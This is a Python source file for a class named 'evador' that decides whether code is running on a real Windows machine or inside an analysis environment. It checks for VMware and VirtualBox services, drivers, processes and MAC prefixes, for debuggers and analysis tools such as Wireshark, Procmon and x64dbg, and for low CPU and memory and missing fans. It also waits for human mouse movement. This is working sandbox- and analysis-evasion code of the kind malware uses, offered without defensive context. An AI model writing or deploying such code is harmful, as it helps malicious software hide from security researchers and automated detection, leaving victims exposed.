import os
import psutil
import subprocess
import multiprocessing
from ctypes import windll
from pynput.mouse import Controller
from getmac import get_mac_address as gma

class evador:
    mouse_movement_counter = 2000
    running_processes = str(subprocess.check_output("tasklist", shell=True)).lower()
    mouse_controller = Controller()

    def __init__(self):
        pass
    
    def run_powershell_command(self, command):
        try:
            return str(subprocess.run(["powershell", "-Command", command], capture_output=True))
        except Exception:
            pass

    def evade_detection(self):
        if not self.is_windows():
            return False
        elif self.is_sandbox():
            return False
        elif self.is_vm():
            return False
        elif self.hardware_tests():
            return False
        elif self.is_on_debug():
            return False
        
        self.mouse_movement()        
        return True

    def is_windows(self):
        try:
            return os.name == "nt"
        except Exception:
            return False

    def hardware_tests(self):
        if multiprocessing.cpu_count() == None or multiprocessing.cpu_count() < 2:
            return True            
        if psutil.virtual_memory().total < 2900000000:
            return True
        
        fans_data = str(self.run_powershell_command("Get-WmiObject -Class Win32_Fan")).strip()
        if fans_data == None or len(fans_data) == 0 or "ObjectNotFound" in fans_data:
            return True
        
        return False

    def mouse_movement(self):
        counter = 0
        current_position = self.mouse_controller.position
        
        while counter < self.mouse_movement_counter:
            old_position = self.mouse_controller.position
            if current_position != old_position:
                current_position = old_position
                counter += 1

    def is_vm(self):
        try:
            services_running = self.run_powershell_command("get-service")
            
            known_services = ['VMTools', 'Vmhgfs', 'VMMEMCTL', 'Vmmouse', 'Vmrawdsk', 'Vmusbmouse', 'Vmvss', 'Vmscsi', 'Vmxnet', 'vmx_svga', 'Vmware Tools', 'Vmware Physical Disk Helper Service']
            for service in known_services:
                if service.lower() in services_running:
                    return True
            
            known_files = ['C:\\windows\\System32\\Drivers\\Vmmouse.sys', 'C:\\windows\\System32\\Drivers\\vm3dgl.dll', 'C:\\windows\\System32\\Drivers\\vmdum.dll', 'C:\\windows\\System32\\Drivers\\vm3dver.dll', 'C:\\windows\\System32\\Drivers\\vmtray.dll', 'C:\\windows\\System32\\Drivers\\VMToolsHook.dll', 'C:\\windows\\System32\\Drivers\\vmmousever.dll', 'C:\\windows\\System32\\Drivers\\vmhgfs.dll', 'C:\\windows\\System32\\Drivers\\vmGuestLib.dll', 'C:\\windows\\System32\\Drivers\\VmGuestLibJava.dll', 'C:\\windows\\System32\\Driversvmhgfs.dll', 'C:\\windows\\System32\\Drivers\\VBoxMouse.sys', 'C:\\windows\\System32\\Drivers\\VBoxGuest.sys', 'C:\\windows\\System32\\Drivers\\VBoxSF.sys', 'C:\\windows\\System32\\Drivers\\VBoxVideo.sys', 'C:\\windows\\System32\\vboxdisp.dll', 'C:\\windows\\System32\\vboxhook.dll', 'C:\\windows\\System32\\vboxmrxnp.dll', 'C:\\windows\\System32\\vboxogl.dll', 'C:\\windows\\System32\\vboxoglarrayspu.dll', 'C:\\windows\\System32\\vboxoglcrutil.dll', 'C:\\windows\\System32\\vboxoglerrorspu.dll', 'C:\\windows\\System32\\vboxoglfeedbackspu.dll', 'C:\\windows\\System32\\vboxoglpackspu.dll', 'C:\\windows\\System32\\vboxoglpassthroughspu.dll', 'C:\\windows\\System32\\vboxservice.exe', 'C:\\windows\\System32\\vboxtray.exe', 'C:\\windows\\System32\\VBoxControl.exe']
            for file in known_files:
                if os.path.exists(file) and os.path.isfile(file):
                    return True
            
            known_processes = ['Vmtoolsd.exe', 'Vmwaretrat.exe', 'Vmwareuser.exe', 'Vmacthlp.exe', 'vboxservice.exe', 'vboxtray.exe']
            for process in known_processes:
                if process.lower() in self.running_processes:
                    return True
            
            known_mac_addresses = ['00:05:69', '00:0C:29', '00:1C:14', '00:50:56', '08:00:27']
            for address in known_mac_addresses:
                if address == str(gma()):
                    return True
            
            return False
        except Exception:
            return True

    def is_on_debug(self):
        try:
            return windll.kernel32.IsDebuggerPresent() != 0
        except Exception:
            return True

    def is_sandbox(self):
        try:
            known_processes = ['Wireshark.exe', 'Fiddler.exe', 'Procmon64.exe', 'Procmon.exe', 'Procexp.exe', 'Procexp64.exe', 'Sysmon64.exe', 'Sysmon.exe', 'ProcessHacker.exe', 'OllyDbg.exe', 'ImmunityDebugger.exe', 'x64dbg.exe', 'x32dbg.exe', 'Windbgx64.exe', 'Windbgx86.exe']
            for process in known_processes:
                if process.lower() in self.running_processes:
                    return True
        
            return False
        except Exception:
            return True